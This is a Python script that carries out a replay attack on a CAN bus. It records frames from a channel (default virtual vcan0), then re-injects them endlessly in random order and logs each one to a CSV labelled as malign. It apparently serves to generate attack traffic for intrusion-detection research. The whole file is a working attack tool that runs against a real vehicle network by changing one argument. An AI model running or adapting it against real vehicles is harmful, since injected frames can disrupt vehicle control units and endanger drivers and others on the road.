import can
import time
import argparse
import random
import csv
from pathlib import Path

SLEEP_MIN = 0.05
SLEEP_MAX = 0.5


def replay_attack(channel="vcan0", record_duration=10, output_file="replay_log.csv"):
    recorded_messages = []
    print(f"--- RECORDING PHASE ({record_duration} seconds) on {channel} ---")

    try:
        with can.interface.Bus(channel=channel, interface="socketcan") as bus:
            end_time = time.time() + record_duration
            while time.time() < end_time:
                msg = bus.recv(timeout=0.1)
                if msg:
                    recorded_messages.append(msg)
                    print(
                        f"Recorded: ID=0x{msg.arbitration_id:X}, Data={msg.data.hex().upper()}",
                        end="\r",
                    )
    except can.CanError as e:
        print(f"\nError during recording: {e}")
        return

    if not recorded_messages:
        print("\nNo messages were recorded. Exiting.")
        return

    print(f"\n--- RECORDING COMPLETE: {len(recorded_messages)} messages captured ---")
    time.sleep(2)
    print(f"--- REPLAY PHASE on {channel} ---")
    print(f"Logging replayed messages to {output_file}")

    output_path = Path(output_file)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    try:
        with output_path.open("w", newline="") as f, can.interface.Bus(
            channel=channel, interface="socketcan"
        ) as bus:
            writer = csv.writer(f)
            writer.writerow(
                [
                    "Timestamp",
                    "ID (HEX)",
                    "Message Name",
                    "Data (HEX)",
                    "Decoded Signals",
                    "Legitimacy",
                ]
            )

            while True:
                random.shuffle(recorded_messages)  # Replay in random order
                for msg in recorded_messages:
                    # Create a new message object for replay
                    replay_msg = can.Message(
                        arbitration_id=msg.arbitration_id,
                        data=msg.data,
                        is_extended_id=msg.is_extended_id,
                    )
                    try:
                        bus.send(replay_msg)
                        # Log the replayed message
                        writer.writerow(
                            [
                                time.time(),
                                f"{replay_msg.arbitration_id:03X}",
                                "Replay_Attack",
                                replay_msg.data.hex().upper(),
                                "{}",
                                "Malign",
                            ]
                        )
                        time.sleep(random.uniform(SLEEP_MIN, SLEEP_MAX))
                    except can.CanError as e:
                        print(f"Error sending message: {e}", end="\r")

    except KeyboardInterrupt:
        print("\nReplay attack interrupted.")
    except can.CanError as e:
        print(f"Error during replay: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Run a Replay attack on a CAN bus and log sent messages."
    )
    parser.add_argument("-c", "--channel", default="vcan0")
    parser.add_argument("-d", "--duration", type=int, default=10)
    parser.add_argument("-o", "--output", default="../csv/replay_attack_log.csv")
    args = parser.parse_args()

    replay_attack(channel=args.channel, record_duration=args.duration, output_file=args.output)
